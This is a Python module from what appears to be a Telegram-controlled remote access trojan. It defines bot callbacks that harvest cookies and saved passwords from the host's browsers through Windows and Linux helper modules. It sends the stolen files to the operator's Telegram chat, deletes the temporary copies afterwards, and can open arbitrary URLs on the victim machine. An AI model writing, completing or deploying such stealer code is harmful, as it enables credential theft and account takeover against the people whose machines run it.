import config
import constants
from command_registry import registry
from utils import getarg, getMarkupModes, validate_time_argument, create_menu_markup, send_message


async def stealcookie_callback(bot, call):
    markup = getMarkupModes()

    cookie_paths = steal_cookie()

    for browser, cookie in cookie_paths.items():
        await send_message(bot, call.message.chat.id, text=browser + ':')

        if cookie[0]:
            await send_message(bot, call.message.chat.id, cookie[1], reply_markup=markup)
            continue

        with open(cookie[1], 'rb') as f:
            await bot.send_document(call.message.chat.id, f, reply_markup=markup)

    delete_tmp_cookies()


async def stealpasswords_callback(bot, call):
    markup = getMarkupModes()

    passwords_path = steal_passwords()

    with open(passwords_path, 'rb') as f:
        await bot.send_document(call.message.chat.id, f, reply_markup=markup)

    delete_tmp_passwords()


if config.os_name == constants.Windows_OS:
    from modules import Browser_windows as current_browser
if config.os_name == constants.Linux_OS:
    from modules import Browser_linux as current_browser


@registry.register(
    command_name=constants.BROWSER_OPENURL_command,
    permission_name=constants.BROWSER_OPENURL,
)
async def openurl(bot, message):
    markup = getMarkupModes()

    url = getarg(message.text, constants.BROWSER_OPENURL_command)

    error_flag, answer = open_url(url)

    await send_message(bot, message.chat.id, text=constants.openurl_opened_message, reply_markup=markup)


def open_url(url):
    return current_browser.open_url(url)


def steal_cookie():
    return current_browser.steal_cookie()


def delete_tmp_cookies():
    return current_browser.delete_tmp_cookies()


def get_browsers():
    return current_browser.get_browsers()


def steal_passwords():
    return current_browser.steal_passwords()


def delete_tmp_passwords():
    return current_browser.delete_tmp_passwords()


modes = current_browser.modes
